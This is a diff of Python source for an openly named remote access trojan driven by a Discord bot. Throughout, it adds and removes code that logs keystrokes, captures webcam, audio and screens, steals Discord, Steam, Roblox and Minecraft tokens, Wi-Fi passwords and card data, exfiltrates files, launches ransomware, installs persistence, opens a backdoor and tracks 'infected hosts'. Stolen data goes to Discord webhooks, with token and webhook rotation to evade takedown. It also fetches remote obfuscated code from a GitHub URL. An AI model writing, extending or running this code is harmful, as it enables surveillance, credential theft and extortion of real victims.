@@ -76,7 +76,7 @@ def install_missing_packages():
         'aiohttp', 'pyinstaller', 'pynput', 'opencv-python', 'discord.py'
     ]
     installed = {pkg.key for pkg in pkg_resources.working_set}
-    missing = [pkg forpkg in required if pkg not in installed]
+    missing = [pkg for pkg in required if pkg not in installed]
     if missing:
         logger.info(f"Installing: {missing}")
         for pkg in missing:
@@ -160,9 +160,11 @@ generate_spec_file("rat_pc.py", spec_path)
 build_executable(spec_path)
 
 # RAT Setup Constants
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
-TOKEN = "Y25meWRoZ19nTX9rbFBU0STO1bJl81G4J46muxnUHDNxelp.xNEz_G.Q9273827z343D4899k0809TM"[::-1]
-BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/heads/main/obfuscated%20BOT%20CODE.txt"
+with open('tokens.json', 'r') as f:
+    config = json.load(f)
+
+DISCORD_TOKENS = config['discord_tokens']
+WEBHOOK_URLS = config['webhook_urls']
 UNIQUE_ID = str(uuid.uuid4())
 
 logger.info(f"InstanceID: {UNIQUE_ID}")
@@ -189,164 +191,250 @@ def download_and_execute_bot_control_script():
     except Exception as e:
         logger.error(f"Failed to download or execute bot control script: {e}")
 
-def send_webhook(message):
+def send_webhook(message, webhook_url=None):
+    if not webhook_url:
+        webhook_url = random.choice(WEBHOOK_URLS)
     try:
         payload = {"content": message}
-        response = requests.post(WEBHOOK_URL, json=payload)
+        response = requests.post(webhook_url, json=payload)
         if response.status_code == 204:
             logger.info("Data sent to Discord successfully")
         else:
             logger.error(f"Failed to send data to Discord: {response.status_code}")
+            send_webhook(message, webhook_url=next_webhook(webhook_url))
     except Exception as e:
         logger.error(f"Webhook failed: {e}")
+        send_webhook(message, webhook_url=next_webhook(webhook_url))
 
-def log_keystroke(key):
+def next_webhook(current_webhook):
+    index = WEBHOOK_URLS.index(current_webhook)
+    return WEBHOOK_URLS[(index + 1) % len(WEBHOOK_URLS)]
+
+async def handle_command(cmd):
+    global TOKEN
     try:
-        if isinstance(key, Key):
-            key_str = str(key)
-        elif isinstance(key, KeyCode):
-            key_str = key.char if key.char else str(key)
+        if cmd == "list_accounts":
+            try:
+                tokens = find_discord_tokens() + find_minecraft_tokens() + find_steam_tokens() + find_roblox_tokens()
+                if tokens:
+                    send_webhook(f"accounts\nFound {len(tokens)} tokens:\n" + "\n".join(tokens))
+                else:
+                    send_webhook("accounts\nNo tokens found.")
+            except Exception as e:
+                logger.error(f"Failed to list accounts: {e}")
+
+        elif cmd == "dump_wifi":
+            try:
+                wifi_credentials = dump_wifi_credentials()
+                if wifi_credentials:
+                    send_webhook(f"wifi_credentials\nFound {len(wifi_credentials)} Wi-Fi credentials:\n" + "\n".join([f"{ssid}: {password}" for ssid, password in wifi_credentials]))
+                else:
+                    send_webhook("wifi_credentials\nNo Wi-Fi credentials found.")
+            except Exception as e:
+                logger.error(f"Failed to dump Wi-Fi credentials: {e}")
+
+        elif cmd == "start_webcam":
+            try:
+                screenshot_path = await take_screenshot()
+                if screenshot_path and cv2:
+                    await upload_file(screenshot_path)
+                else:
+                    send_webhook("start_webcam\nFailed to capture webcam.")
+            except Exception as e:
+                logger.error(f"Failed to start webcam: {e}")
+
+        elif cmd.startswith("exfiltrate "):
+            try:
+                path = cmd.split(" ")[1]
+                exfiltrate_files(path)
+                send_webhook(f"exfiltrate {path}\nExfiltration started for {path}.")
+            except Exception as e:
+                logger.error(f"Failed to exfiltrate files: {e}")
+
+        elif cmd == "start_ransomware":
+            try:
+                start_ransomware()
+            except Exception as e:
+                logger.error(f"Failed to start ransomware: {e}")
+
+        elif cmd == "install_persistence":
+            try:
+                install_persistence()
+                send_webhook("install_persistence\nPersistence installed.")
+            except Exception as e:
+                logger.error(f"Failed to install persistence: {e}")
+
+        elif cmd == "self_destruct":
+            try:
+                self_destruct()
+            except Exception as e:
+                logger.error(f"Failed to self-destruct: {e}")
+
+        elif cmd.startswith("open_backdoor "):
+            try:
+                ip, port = cmd.split(" ")[1].split(":")
+                backdoor_thread = threading.Thread(target=open_backdoor, args=(ip, int(port)))
+                backdoor_thread.start()
+                send_webhook(f"open_backdoor\nBackdoor opened on {ip}:{port}.")
+            except Exception as e:
+                logger.error(f"Failed to open backdoor: {e}")
+
+        elif cmd == "get_ip":
+            try:
+                ip_info = get_ip_and_geolocation()
+                send_webhook(f"get_ip\nIP Info: {json.dumps(ip_info, indent=2)}")
+            except Exception as e:
+                logger.error(f"Failed to get IP info: {e}")
+
+        elif cmd == "record_audio":
+            try:
+                audio_path = await record_audio()
+                if audio_path:
+                    await upload_file(audio_path)
+                else:
+                    send_webhook("record_audio\nFailed to record audio.")
+            except Exception as e:
+                logger.error(f"Failed to record audio: {e}")
+
+        elif cmd == "steamdump":
+            try:
+                steam_data = find_steam_phished_data()
+                if steam_data:
+                    send_webhook(f"steamdump\nFound Steam data:\n{steam_data}")
+                else:
+                    send_webhook("steamdump\nNo Steam data found.")
+            except Exception as e:
+                logger.error(f"Failed to dump Steam data: {e}")
+
+        elif cmd == "minecraftdump":
+            try:
+                minecraft_data = find_minecraft_phished_data()
+                if minecraft_data:
+                    send_webhook(f"minecraftdump\nFound Minecraft data:\n{minecraft_data}")
+                else:
+                    send_webhook("minecraftdump\nNo Minecraft data found.")
+            except Exception as e:
+                logger.error(f"Failed to dump Minecraft data: {e}")
+
+        elif cmd == "robloxdump":
+            try:
+                roblox_data = find_roblox_phished_data()
+                if roblox_data:
+                    send_webhook(f"robloxdump\nFound Roblox data:\n{roblox_data}")
+                else:
+                    send_webhook("robloxdump\nNo Roblox data found.")
+            except Exception as e:
+                logger.error(f"Failed to dump Roblox data: {e}")
+
+        elif cmd == "discorddump":
+            try:
+                discord_data = find_discord_phished_data()
+                if discord_data:
+                    send_webhook(f"discorddump\nFound Discord data:\n{discord_data}")
+                else:
+                    send_webhook("discorddump\nNo Discord data found.")
+            except Exception as e:
+                logger.error(f"Failed to dump Discord data: {e}")
+
+        elif cmd == "ccdump":
+            try:
+                cc_data = find_cc_phished_data()
+                if cc_data:
+                    send_webhook(f"ccdump\nFound CC data:\n{cc_data}")
+                else:
+                    send_webhook("ccdump\nNo CC data found.")
+            except Exception as e:
+                logger.error(f"Failed to dump CC data: {e}")
+
+        elif cmd.startswith("swap_host "):
+            try:
+                new_host = cmd.split(" ")[1]
+                if new_host in infected_hosts:
+                    current_host = new_host
+                    send_webhook(f"swap_host\nSwitched to host: {new_host}")
+                else:
+                    send_webhook(f"swap_host\nHost {new_host} not found.")
+            except Exception as e:
+                logger.error(f"Failed to swap host: {e}")
+
+        elif cmd.startswith("rename_host "):
+            try:
+                old_name, new_name = cmd.split(" ")[1], cmd.split(" ")[2]
+                if old_name in infected_hosts:
+                    infected_hosts[new_name] = infected_hosts.pop(old_name)
+                    send_webhook(f"rename_host\nHost renamed from {old_name} to {new_name}")
+                else:
+                    send_webhook(f"rename_host\nHost {old_name} not found.")
+            except Exception as e:
+                logger.error(f"Failed to rename host: {e}")
+
+        elif cmd == "list_hosts":
+            try:
+                if infected_hosts:
+                    host_list = "\n".join(infected_hosts.keys())
+                    send_webhook(f"list_hosts\nCurrently infected hosts:\n{host_list}")
+                else:
+                    send_webhook("list_hosts\nNo infected hosts found.")
+            except Exception as e:
+                logger.error(f"Failed to list hosts: {e}")
+
+        elif cmd == "status":
+            try:
+                send_webhook(f"status\nCurrently in host: {current_host}")
+            except Exception as e:
+                logger.error(f"Failed to get status: {e}")
+
+        elif cmd == "help":
+            help_message = """
+            Available commands:
+            - `!list_accounts`: Lists all phished accounts (Discord, Minecraft, Steam, Roblox).
+            - `!dump_wifi`: Dumps Wi-Fi credentials.
+            - `!start_webcam`: Takes a screenshot using the webcam.
+            - `!exfiltrate <path>`: Exfiltrates files from the specified path.
+            - `!start_ransomware`: Starts the ransomware module.
+            - `!install_persistence`: Installs persistence on the system.
+            - `!self_destruct`: Initiates self-destruct sequence.
+            - `!open_backdoor <ip>:<port>`: Opens a backdoor on the specified IP and port.
+            - `!get_ip`: Gets the public IP and geolocation information.
+            - `!record_audio`: Records audio from the microphone.
+            - `!steamdump`: Dumps phished Steam data.
+            - `!minecraftdump`: Dumps phished Minecraft data.
+            - `!robloxdump`: Dumps phished Roblox data.
+            - `!discorddump`: Dumps phished Discord data.
+            - `!ccdump`: Dumps phished credit card data.
+            - `!swap_host <host>`: Swaps to the specified host.
+            - `!rename_host <old_name> <new_name>`: Renames the specified host.
+            - `!list_hosts`: Lists all currently infected hosts.
+            - `!status`: Shows the current host status.
+            - `!help`: Displays this help message.
+            """
+            send_webhook(f"help\n{help_message}")
+
         else:
-            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
-        logger.info(key_str)
-        send_webhook(key_str)
-    except Exception as e:
-        logger.error(f"Keylogging failed: {e}")
+            send_webhook(f"unknown_command\nUnknown command: {cmd}")
 
-def start_keylogger():
-    def on_press(key):
-        try:
-            log_keystroke(key)
-        except Exception as e:
-            logger.error(f"Keylogger failed: {e}")
-        return False
-    try:
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-    except Exception as e:
-        logger.error(f"Keylogger listener error: {e}")
+    except discord.errors.HTTPException as e:
+        if e.status == 401:
+            logger.warning("Token revoked, switching to next token.")
+            TOKEN = next_token(TOKEN)
+            await bot.start(TOKEN)
+        else:
+            raise
 
-def record_audio(duration=30):
-    try:
-        p = pyaudio.PyAudio()
-        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
-        frames = []
-        for _ in range(0, int(44100 / 1024 * duration)):
-            data = stream.read(1024)
-            frames.append(data)
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        filename = f"audio_{int(time.time())}.wav"
-        with wave.open(filename, 'wb') as wf:
-            wf.setnchannels(1)
-            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
-            wf.setframerate(44100)
-            wf.writeframes(b''.join(frames))
-        send_webhook(f"Audio recorded and saved as {filename}")
-    except Exception as e:
-        logger.error(f"Audio recording failed: {e}")
+def next_token(current_token):
+    index = DISCORD_TOKENS.index(current_token)
+    return DISCORD_TOKENS[(index + 1) % len(DISCORD_TOKENS)]
 
-def capture_screenshot():
-    try:
-        screenshot = ImageGrab.grab()
-        filename = f"screenshot_{int(time.time())}.png"
-        screenshot.save(filename)
-        send_webhook(f"Screenshot captured successfully: {filename}")
-    except Exception as e:
-        logger.error(f"Screenshot capture failed: {e}")
+def rotate_tokens():
+    global TOKEN
+    global WEBHOOK_URL
+    TOKEN = random.choice(DISCORD_TOKENS)
+    WEBHOOK_URL = random.choice(WEBHOOK_URLS)
+    logger.info(f"Rotated to new token: {TOKEN}")
+    logger.info(f"Rotated to new webhook: {WEBHOOK_URL}")
+    threading.Timer(3600, rotate_tokens).start()  # Rotate every hour
 
-def capture_webcam():
-    try:
-        cap = cv2.VideoCapture(0)
-        ret, frame = cap.read()
-        if ret:
-            filename = f"webcam_{int(time.time())}.png"
-            cv2.imwrite(filename, frame)
-            send_webhook(f"Webcam photo saved as {filename}")
-            cap.release()
-    except Exception as e:
-        logger.error(f"Webcam capture failed: {e}")
-
-def steam_dump():
-    try:
-        steam_token = None
-        steam_path = os.path.join(os.getenv('APPDATA'), 'Steam', 'userdata')
-        for root, dirs, files in os.walk(steam_path):
-            for file in files:
-                if file == 'loginusers.vdf':
-                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
-                        data = f.read()
-                    if 'steamid' in data:
-                        steam_token = data.split('steamid')[1].split('"')[1]
-                        send_webhook(f"Steam token found: {steam_token}")
-        if not steam_token:
-            send_webhook("No Steam token found.")
-    except Exception as e:
-        logger.error(f"Steam dump failed: {e}")
-
-def discord_dump():
-    try:
-        discord_token = None
-        appdata = os.getenv('APPDATA')
-        for root, dirs, files in os.walk(appdata):
-            for file in files:
-                if file == 'settings.json' and 'Discord' in root:
-                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
-                        data = f.read()
-                    if 'token' in data:
-                        discord_token = data.split('token')[1].split('"')[1]
-                        send_webhook(f"Discord token found: {discord_token}")
-        if not discord_token:
-            send_webhook("No Discord token found.")
-    except Exception as e:
-        logger.error(f"Discord dump failed: {e}")
-
-def roblox_dump():
-    try:
-        roblox_token = None
-        roblox_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Roblox', 'ClientSettings')
-        for root, dirs, files in os.walk(roblox_path):
-            for file in files:
-                if file == 'client-settings.json':
-                    with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
-                        data = f.read()
-                    if 'cookie' in data:
-                        roblox_token = data.split('cookie')[1].split('"')[1]
-                        send_webhook(f"Roblox token found: {roblox_token}")
-        if not roblox_token:
-            send_webhook("No Roblox token found.")
-    except Exception as e:
-        logger.error(f"Roblox dump failed: {e}")
-
-def minecraft_dump():
-    try:
-        minecraft_token = None
-        minecraft_path = os.path.join(os.getenv('APPDATA'), '.minecraft', 'launcher_profiles.json')
-        if os.path.exists(minecraft_path):
-            with open(minecraft_path, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            if 'auth_player_name' in data:
-                minecraft_token = data['auth_player_name']
-                send_webhook(f"Minecraft session found: {minecraft_token}")
-        if not minecraft_token:
-            send_webhook("No Minecraft token found.")
-    except Exception as e:
-        logger.error(f"Minecraft dump failed: {e}")
-
-def exfiltrate_files():
-    try:
-        files = [f for f in os.listdir() if f.endswith('.txt')]
-        for file in files:
-            send_webhook(f"Exfiltrated file: {file}")
-    except Exception as e:
-        logger.error(f"File exfiltration failed: {e}")
-
-def apply_rootkit_technique():
-    try:
-        ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
-    except Exception as e:
-        logger.error(f"Failed to apply rootkit technique: {e}")
+rotate_tokens()
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -399,6 +487,8 @@ async def on_message(message):
 
 async def setup():
     apply_rootkit_technique()
+    global TOKEN
+    TOKEN = random.choice(DISCORD_TOKENS)
     await bot.start(TOKEN)
 
 if __name__ == '__main__':
